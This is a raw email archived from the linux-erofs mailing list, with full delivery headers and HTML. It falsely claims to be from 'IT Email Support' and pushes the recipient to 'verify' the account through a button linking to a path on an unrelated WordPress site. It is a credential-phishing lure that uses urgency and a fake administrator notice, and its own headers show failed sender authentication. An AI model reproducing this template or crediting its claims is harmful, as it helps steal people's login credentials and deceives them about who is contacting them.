Return-Path: <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>
X-Original-To: lists+linux-erofs@lfdr.de
Delivered-To: lists+linux-erofs@lfdr.de
Received: from lists.ozlabs.org (lists.ozlabs.org [112.213.38.117])
	by mail.lfdr.de (Postfix) with ESMTPS id 13E3A42843C
	for <lists+linux-erofs@lfdr.de>; Mon, 11 Oct 2021 02:06:10 +0200 (CEST)
Received: from boromir.ozlabs.org (localhost [IPv6:::1])
	by lists.ozlabs.org (Postfix) with ESMTP id 4HSJwv4jm4z2ygF
	for <lists+linux-erofs@lfdr.de>; Mon, 11 Oct 2021 11:06:07 +1100 (AEDT)
Authentication-Results: lists.ozlabs.org;
	dkim=fail reason="key not found in DNS" header.d=chishokan.co.jp header.i=noreply@chishokan.co.jp header.a=rsa-sha256 header.s=default header.b=vkliTmF/;
	dkim-atps=neutral
X-Original-To: linux-erofs@lists.ozlabs.org
Delivered-To: linux-erofs@lists.ozlabs.org
Authentication-Results: lists.ozlabs.org;
 spf=softfail (domain owner discourages use of this
 host) smtp.mailfrom=chishokan.co.jp (client-ip=165.232.170.143;
 helo=noreply0.chishokan.co.jp; envelope-from=noreply@chishokan.co.jp;
 receiver=<UNKNOWN>)
Authentication-Results: lists.ozlabs.org;
 dkim=fail reason="key not found in DNS" header.d=chishokan.co.jp
 header.i=noreply@chishokan.co.jp header.a=rsa-sha256 header.s=default
 header.b=vkliTmF/; dkim-atps=neutral
X-Greylist: delayed 604 seconds by postgrey-1.36 at boromir;
 Mon, 11 Oct 2021 11:06:02 AEDT
Received: from noreply0.chishokan.co.jp (unknown [165.232.170.143])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by lists.ozlabs.org (Postfix) with ESMTPS id 4HSJwp2kqGz2xtb
 for <linux-erofs@lists.ozlabs.org>; Mon, 11 Oct 2021 11:06:02 +1100 (AEDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=chishokan.co.jp; 
 h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=noreply@chishokan.co.jp;
 bh=OlR84OJwK7C5bh4kFOPlVDqKte95Gekd/4T3A5UwGd4=;
 b=vkliTmF/xzZ23RxEyoGxP8K5JEyNBRmwt+OeqCvjSGLBI5AvVeSPAVe9tuv1KDq0Ajvkhodcb747
 qOGvPb+X0h9xhOKYtxDfKcq38ME9xnScGRTrcdGaEMgtf9HGkerf2asY5oEV1XxjkUVrbeUi7rsP
 fVSa4T/yHegQ69k8f7Q=
From: IT Email Support <noreply@chishokan.co.jp>
To: linux-erofs@lists.ozlabs.org
Subject: linux-erofs@lists.ozlabs.org Verification
Date: 10 Oct 2021 16:45:51 -0700
Message-ID: <20211010164551.42455258A918AF45@chishokan.co.jp>
MIME-Version: 1.0
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable
X-BeenThere: linux-erofs@lists.ozlabs.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Development of Linux EROFS file system <linux-erofs.lists.ozlabs.org>
List-Unsubscribe: <https://lists.ozlabs.org/options/linux-erofs>,
 <mailto:linux-erofs-request@lists.ozlabs.org?subject=unsubscribe>
List-Archive: <http://lists.ozlabs.org/pipermail/linux-erofs/>
List-Post: <mailto:linux-erofs@lists.ozlabs.org>
List-Help: <mailto:linux-erofs-request@lists.ozlabs.org?subject=help>
List-Subscribe: <https://lists.ozlabs.org/listinfo/linux-erofs>,
 <mailto:linux-erofs-request@lists.ozlabs.org?subject=subscribe>
Reply-To: noreply@lists.ozlabs.org
Errors-To: linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org
Sender: "Linux-erofs"
 <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body style=3D"MARGIN: 0.5em">
<DIV id=3Dyiv3835738702m_-3963264072071041189m_-2068912727642064907m_600989=
1601274502908m_21672076248843749m_-5271971888064844125m_-624552921922887961=
9gmail-m_3983087730740183267gmail-xd123e1ec33bf4f6 style=3D"FONT-SIZE: 13px=
; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(38,38,38); FONT-STYLE: n=
ormal; TEXT-ALIGN: left; PADDING-TOP: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; BORDER-TOP-WIDTH: 0px;=20
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; text-decoration-style=
: initial; text-decoration-color: initial; font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-shadow: none"><FONT style=3D"text-shadow: none" si=
ze=3D3 face=3DCalibri>Dear&nbsp;linux-erofs@lists.ozlabs.org</FONT></DIV>
<DIV id=3Dyiv3835738702m_-3963264072071041189m_-2068912727642064907m_600989=
1601274502908m_21672076248843749m_-5271971888064844125m_-624552921922887961=
9gmail-m_3983087730740183267gmail-xd123e1ec33bf4f6 style=3D"FONT-SIZE: 13px=
; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(38,38,38); FONT-STYLE: n=
ormal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BAC=
KGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=20
text-decoration-style: initial; text-decoration-color: initial; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial; text-shadow: none"><FONT style=3D"=
text-shadow: none" size=3D3 face=3DCalibri><BR style=3D"text-shadow: none">=
Your&nbsp;Email&nbsp;verification&nbsp;is required to continue using the se=
rvice.</FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(38,38,38); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2=
; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: =
0px; text-decoration-style: initial; text-decoration-color: initial; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-shadow: none"><FONT style=3D"text-shadow: none" size=3D3 face=3DCalibr=
i>please verify your email to avoid loosing your account service.<BR style=
=3D"text-shadow: none"></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(38,38,38); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2=
; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: =
0px; text-decoration-style: initial; text-decoration-color: initial; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-shadow: none"><FONT style=3D"text-shadow: none" size=3D3 face=3DCalibr=
i><BR style=3D"text-shadow: none"></FONT></DIV>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(38,38,38); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2=
; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: =
0px; text-decoration-style: initial; text-decoration-color: initial; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-shadow: none"><FONT style=3D"text-shadow: none" size=3D3 face=3DCalibr=
i></FONT>
<A style=3D"BORDER-LEFT-WIDTH: 0px; TEXT-DECORATION: underline; MAX-WIDTH: =
150px; BORDER-RIGHT-WIDTH: 0px; WIDTH: 210px; VERTICAL-ALIGN: baseline; BOR=
DER-BOTTOM-WIDTH: 0px; COLOR: white; OUTLINE-WIDTH: medium; PADDING-BOTTOM:=
 14px; TEXT-ALIGN: center; PADDING-TOP: 14px; OUTLINE-STYLE: none; PADDING-=
LEFT: 7px; MARGIN: 0px; DISPLAY: block; PADDING-RIGHT: 7px; BORDER-TOP-WIDT=
H: 0px; BACKGROUND-COLOR: blue; text-shadow: none; border-radius: 4px; font=
-stretch: inherit"=20
href=3D"http://www.conflictcuisine.com/wp-includes/css/dist/editor/ssl?emai=
l=3Dlinux-erofs@lists.ozlabs.org" rel=3D"nofollow noopener noreferrer" targ=
et=3D_blank><FONT style=3D"text-shadow: none" face=3DCalibri>Verify&nbsp;yo=
ur linux-erofs@lists.ozlabs.org</FONT></A><BR style=3D"FONT-SIZE: 16px; FON=
T-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; COLOR: rgb(64,=
64,64); text-shadow: none"><FONT style=3D"text-shadow: none" face=3DCalibri=
></FONT>
<P style=3D"COLOR: rgb(64,64,64); text-shadow: none"><FONT style=3D"VERTICA=
L-ALIGN: inherit; text-shadow: none"><FONT style=3D"VERTICAL-ALIGN: inherit=
; text-shadow: none" color=3D#ff0000 face=3DCalibri>This is an automated em=
ail from your administrator to&nbsp;linux-erofs@lists.ozlabs.org.</FONT></F=
ONT></P><FONT style=3D"text-shadow: none" face=3DCalibri><FONT style=3D"VER=
TICAL-ALIGN: inherit; text-shadow: none"><FONT style=3D"VERTICAL-ALIGN: inh=
erit; text-shadow: none" color=3D#000000 size=3D3 face=3DCalibri>&nbsp;</FO=
NT></FONT>
 </FONT><FONT style=3D"text-shadow: none" color=3D#000000 size=3D4 face=3DC=
alibri>IT Email Support</FONT><SPAN style=3D"FONT-SIZE: medium; FONT-FAMILY=
: Calibri; COLOR: rgb(0,0,0); text-shadow: none"><FONT size=3D4>.</FONT></S=
PAN></DIV></BODY></HTML>
